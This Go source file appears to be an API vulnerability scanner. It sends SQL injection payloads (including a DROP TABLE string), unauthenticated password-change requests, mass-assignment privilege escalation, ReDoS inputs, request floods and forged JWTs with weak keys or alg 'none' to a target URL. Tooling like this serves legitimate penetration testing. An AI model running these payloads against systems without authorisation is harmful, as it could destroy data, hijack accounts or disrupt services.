package vuln

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// Tester handles comprehensive vulnerability testing
type Tester struct {
	logger  *logrus.Logger
	client  *http.Client
	baseURL string
	headers map[string]string
}

// New creates a new vulnerability tester instance
func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
	return &Tester{
		logger:  logger,
		client:  client,
		baseURL: strings.TrimRight(baseURL, "/"),
		headers: make(map[string]string),
	}
}

// SetHeader sets a custom header for all requests
func (t *Tester) SetHeader(key, value string) {
	t.headers[key] = value
}

// RunTests performs comprehensive vulnerability testing against the API
func (t *Tester) RunTests(paths []string) error {
	t.logger.Info("Starting comprehensive vulnerability tests")

	tests := []struct {
		name string
		fn   func([]string) error
	}{
		{"SQL Injection", t.testSQLInjection},
		{"Unauthorized Password Change", t.testUnauthorizedPasswordChange},
		{"Mass Assignment", t.testMassAssignment},
		{"Excessive Data Exposure", t.testExcessiveDataExposure},
		{"User Enumeration", t.testUserEnumeration},
		{"RegexDOS", t.testRegexDOS},
		{"Rate Limiting", t.testRateLimiting},
		{"JWT Bypass", t.testJWTBypass},
	}

	var wg sync.WaitGroup
	results := make(chan error, len(tests))

	for _, test := range tests {
		wg.Add(1)
		go func(name string, testFn func([]string) error) {
			defer wg.Done()
			t.logger.Infof("Running %s tests", name)
			if err := testFn(paths); err != nil {
				results <- fmt.Errorf("%s test failed: %v", name, err)
			}
		}(test.name, test.fn)
	}

	wg.Wait()
	close(results)

	// Check for any errors
	for err := range results {
		if err != nil {
			t.logger.Warn(err)
		}
	}

	return nil
}

// SQL Injection Testing
func (t *Tester) testSQLInjection(paths []string) error {
	payloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE users--",
		"' UNION SELECT * FROM users--",
		"' OR '1'='1' /*",
		"admin' --",
		"admin' #",
		"' OR 1=1;--",
		"' OR 'x'='x",
		"1' ORDER BY 1--",
		"1' ORDER BY 2--",
		"1' ORDER BY 3--",
		"1' UNION SELECT null--",
		"1' UNION SELECT null,null--",
		"1' UNION SELECT null,null,null--",
	}

	for _, path := range paths {
		for _, payload := range payloads {
			// Test in URL parameters
			resp, err := t.makeRequest("GET", path+"?id="+payload, nil, nil)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			// Check for SQL error messages
			body, _ := io.ReadAll(resp.Body)
			if t.containsSQLError(string(body)) {
				t.logger.Warnf("Potential SQL injection vulnerability found in %s", path)
			}

			// Test in JSON body
			jsonPayload := map[string]interface{}{
				"id":      payload,
				"user_id": payload,
				"email":   payload,
			}

			resp, err = t.makeRequest("POST", path, nil, jsonPayload)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			body, _ = io.ReadAll(resp.Body)
			if t.containsSQLError(string(body)) {
				t.logger.Warnf("Potential SQL injection vulnerability found in %s (POST)", path)
			}
		}
	}

	return nil
}

// Unauthorized Password Change Testing
func (t *Tester) testUnauthorizedPasswordChange(paths []string) error {
	passwordPaths := []string{
		"/password",
		"/password/reset",
		"/password/change",
		"/user/password",
		"/account/password",
		"/auth/password",
	}

	for _, basePath := range paths {
		for _, pwPath := range passwordPaths {
			path := basePath + pwPath
			payload := map[string]interface{}{
				"password":     "newpassword123",
				"new_password": "newpassword123",
				"user_id":      "victim_user",
				"email":        "victim@example.com",
			}

			// Test without authentication
			resp, err := t.makeRequest("POST", path, nil, payload)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusUnauthorized {
				t.logger.Warnf("Potential unauthorized password change vulnerability in %s", path)
			}

			// Test with missing/invalid CSRF token
			headers := map[string]string{
				"X-CSRF-Token": "invalid_token",
			}
			resp, err = t.makeRequest("POST", path, headers, payload)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode != http.StatusForbidden {
				t.logger.Warnf("Potential CSRF vulnerability in password change at %s", path)
			}
		}
	}

	return nil
}

// Mass Assignment Testing
func (t *Tester) testMassAssignment(paths []string) error {
	sensitiveFields := []string{
		"role", "isAdmin", "admin", "permissions",
		"accessLevel", "userType", "privileges",
		"isSuperuser", "isStaff", "groups",
	}

	for _, path := range paths {
		// Test each sensitive field
		for _, field := range sensitiveFields {
			payload := map[string]interface{}{
				"name":  "Regular User",
				"email": "user@example.com",
				field:   "admin", // Attempt privilege escalation
			}

			resp, err := t.makeRequest("POST", path, nil, payload)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			// Check if the request was successful
			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				body, _ := io.ReadAll(resp.Body)
				if strings.Contains(string(body), field) {
					t.logger.Warnf("Potential mass assignment vulnerability with field '%s' in %s", field, path)
				}
			}
		}
	}

	return nil
}

// Excessive Data Exposure Testing
func (t *Tester) testExcessiveDataExposure(paths []string) error {
	debugPaths := []string{
		"/debug", "/dev", "/test", "/internal",
		"/api/debug", "/api/dev", "/api/test",
		"/debug/vars", "/debug/pprof",
	}

	sensitiveData := []string{
		"password", "secret", "token", "key",
		"credit_card", "ssn", "private",
	}

	// Test debug endpoints
	for _, basePath := range paths {
		for _, debugPath := range debugPaths {
			path := basePath + debugPath
			resp, err := t.makeRequest("GET", path, nil, nil)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				body, _ := io.ReadAll(resp.Body)
				for _, sensitive := range sensitiveData {
					if strings.Contains(strings.ToLower(string(body)), sensitive) {
						t.logger.Warnf("Potential sensitive data exposure in debug endpoint %s", path)
					}
				}
			}
		}
	}

	// Test regular endpoints for excessive data
	for _, path := range paths {
		resp, err := t.makeRequest("GET", path, nil, nil)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			for _, sensitive := range sensitiveData {
				if strings.Contains(strings.ToLower(string(body)), sensitive) {
					t.logger.Warnf("Potential excessive data exposure in %s", path)
				}
			}
		}
	}

	return nil
}

// User Enumeration Testing
func (t *Tester) testUserEnumeration(paths []string) error {
	userPaths := []string{
		"/login", "/register", "/signup",
		"/forgot-password", "/reset-password",
		"/auth/login", "/auth/register",
	}

	testCases := []struct {
		username string
		email    string
	}{
		{"admin", "admin@example.com"},
		{"administrator", "administrator@example.com"},
		{"test", "test@example.com"},
		{"user", "user@example.com"},
	}

	for _, basePath := range paths {
		for _, userPath := range userPaths {
			path := basePath + userPath

			for _, tc := range testCases {
				// Test username enumeration
				payload := map[string]interface{}{
					"username": tc.username,
					"email":    "invalid@example.com",
					"password": "wrongpassword",
				}

				resp, err := t.makeRequest("POST", path, nil, payload)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				if t.containsUserEnumeration(string(body)) {
					t.logger.Warnf("Potential username enumeration in %s", path)
				}

				// Test email enumeration
				payload["email"] = tc.email
				payload["username"] = "invalid"

				resp, err = t.makeRequest("POST", path, nil, payload)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				body, _ = io.ReadAll(resp.Body)
				if t.containsUserEnumeration(string(body)) {
					t.logger.Warnf("Potential email enumeration in %s", path)
				}
			}
		}
	}

	return nil
}

// RegexDOS Testing
func (t *Tester) testRegexDOS(paths []string) error {
	// Evil regex patterns that can cause catastrophic backtracking
	payloads := []string{
		strings.Repeat("a", 100) + "!",
		strings.Repeat("a?", 50) + strings.Repeat("a", 50),
		strings.Repeat("(a+)", 50),
		strings.Repeat("abcdefghijklmnopqrstuvwxyz", 100),
	}

	for _, path := range paths {
		for _, payload := range payloads {
			// Test in query parameters
			start := time.Now()
			resp, err := t.makeRequest("GET", path+"?q="+payload, nil, nil)
			duration := time.Since(start)

			if err != nil {
				if duration > 5*time.Second {
					t.logger.Warnf("Potential RegexDOS vulnerability in %s (timeout after %v)", path, duration)
				}
				continue
			}
			defer resp.Body.Close()

			if duration > 5*time.Second {
				t.logger.Warnf("Potential RegexDOS vulnerability in %s (slow response: %v)", path, duration)
			}

			// Test in request body
			payload := map[string]interface{}{
				"query":  payload,
				"search": payload,
				"filter": payload,
			}

			start = time.Now()
			resp, err = t.makeRequest("POST", path, nil, payload)
			duration = time.Since(start)

			if err != nil {
				if duration > 5*time.Second {
					t.logger.Warnf("Potential RegexDOS vulnerability in %s POST (timeout after %v)", path, duration)
				}
				continue
			}
			defer resp.Body.Close()

			if duration > 5*time.Second {
				t.logger.Warnf("Potential RegexDOS vulnerability in %s POST (slow response: %v)", path, duration)
			}
		}
	}

	return nil
}

// Rate Limiting Testing
func (t *Tester) testRateLimiting(paths []string) error {
	for _, path := range paths {
		// Test rapid requests
		start := time.Now()
		var wg sync.WaitGroup
		responses := make(chan *http.Response, 100)

		for i := 0; i < 100; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				resp, err := t.makeRequest("GET", path, nil, nil)
				if err == nil {
					responses <- resp
				}
			}()
		}

		wg.Wait()
		close(responses)

		// Analyze responses
		var successCount int
		for resp := range responses {
			if resp.StatusCode == http.StatusOK {
				successCount++
			}
			resp.Body.Close()
		}

		duration := time.Since(start)
		if successCount > 90 && duration < 10*time.Second {
			t.logger.Warnf("Potential lack of rate limiting in %s (%d successful requests in %v)", path, successCount, duration)
		}

		// Test burst requests
		burstSize := 20
		burstCount := 5
		for i := 0; i < burstCount; i++ {
			successCount = 0
			for j := 0; j < burstSize; j++ {
				resp, err := t.makeRequest("GET", path, nil, nil)
				if err == nil {
					if resp.StatusCode == http.StatusOK {
						successCount++
					}
					resp.Body.Close()
				}
			}
			if successCount == burstSize {
				t.logger.Warnf("Potential lack of burst rate limiting in %s (burst %d/%d)", path, i+1, burstCount)
			}
			time.Sleep(1 * time.Second)
		}
	}

	return nil
}

// JWT Bypass Testing
func (t *Tester) testJWTBypass(paths []string) error {
	weakKeys := []string{
		"secret", "key", "private", "jwt_secret",
		"jwt_key", "auth_secret", "auth_key",
		"token_secret", "token_key", "api_secret",
		"api_key", "app_secret", "app_key",
	}

	// Test common weak signing keys
	for _, path := range paths {
		for _, key := range weakKeys {
			// Generate JWT with weak key
			token := t.generateWeakJWT(key)
			headers := map[string]string{
				"Authorization": "Bearer " + token,
			}

			resp, err := t.makeRequest("GET", path, headers, nil)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Potential JWT bypass with weak key '%s' in %s", key, path)
			}
		}

		// Test algorithm confusion
		noneToken := t.generateNoneAlgJWT()
		headers := map[string]string{
			"Authorization": "Bearer " + noneToken,
		}

		resp, err := t.makeRequest("GET", path, headers, nil)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			t.logger.Warn("Potential JWT algorithm confusion vulnerability in " + path)
		}
	}

	return nil
}

// Helper methods

func (t *Tester) makeRequest(method, path string, headers map[string]string, payload interface{}) (*http.Response, error) {
	var body io.Reader

	if payload != nil {
		jsonData, err := json.Marshal(payload)
		if err != nil {
			return nil, err
		}
		body = strings.NewReader(string(jsonData))
	}

	url := t.baseURL + path
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}

	// Add default headers
	for k, v := range t.headers {
		req.Header.Set(k, v)
	}

	// Add request-specific headers
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	if payload != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	return t.client.Do(req)
}

func (t *Tester) containsSQLError(response string) bool {
	sqlErrors := []string{
		"SQL syntax",
		"mysql_fetch_array",
		"MySQLSyntaxErrorException",
		"valid MySQL result",
		"check the manual that corresponds to your MySQL server version",
		"SQLException",
		"ORA-",
		"Oracle error",
		"SQL command not properly ended",
		"postgresql.util.PSQLException",
		"org.postgresql.util",
		"PG::Error",
		"Npgsql.",
	}

	responseLower := strings.ToLower(response)
	for _, err := range sqlErrors {
		if strings.Contains(responseLower, strings.ToLower(err)) {
			return true
		}
	}
	return false
}

func (t *Tester) containsUserEnumeration(response string) bool {
	enumerationHints := []string{
		"user not found",
		"invalid username",
		"username doesn't exist",
		"email not found",
		"email doesn't exist",
		"incorrect password",
		"wrong password",
	}

	responseLower := strings.ToLower(response)
	for _, hint := range enumerationHints {
		if strings.Contains(responseLower, hint) {
			return true
		}
	}
	return false
}

func (t *Tester) generateWeakJWT(key string) string {
	// Create a simple JWT with a weak key
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"1234567890","name":"John Doe","admin":true}`))

	mac := hmac.New(sha256.New, []byte(key))
	mac.Write([]byte(header + "." + payload))
	signature := mac.Sum(nil)

	return header + "." + payload + "." + base64.RawURLEncoding.EncodeToString(signature)
}

func (t *Tester) generateNoneAlgJWT() string {
	// Create a JWT with "none" algorithm
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"1234567890","name":"John Doe","admin":true}`))

	return header + "." + payload + "."
}
